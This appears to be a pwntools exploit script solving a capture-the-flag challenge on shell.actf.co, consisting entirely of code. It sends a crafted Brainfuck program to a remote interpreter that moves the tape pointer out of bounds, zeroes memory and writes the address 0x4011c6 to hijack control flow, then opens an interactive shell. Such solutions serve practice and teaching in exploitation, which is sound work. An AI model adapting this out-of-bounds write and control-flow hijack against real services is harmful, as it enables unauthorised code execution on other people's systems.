from pwn import *

p=remote('shell.actf.co',19010)
#p=process('./o')

def do_write(n):
    code=''
    for i in range(3):
        byte = (n>>(i*8))&0xff
        root = int(byte**0.5)
        code += '+'*(byte-root*root)+'>'
        code += '[-]'+root*'+'
        code += '[<'+'+'*root+'>-]'

    #clean
    for i in range(2):
        code += '>[-]'
    return code

p.recvuntil('code: ')
code = '+[>+]'
code += '>'*0x28
code += '[-]'
code += do_write(0x4011c6)

print len(code)

p.sendline(code)
p.interactive()
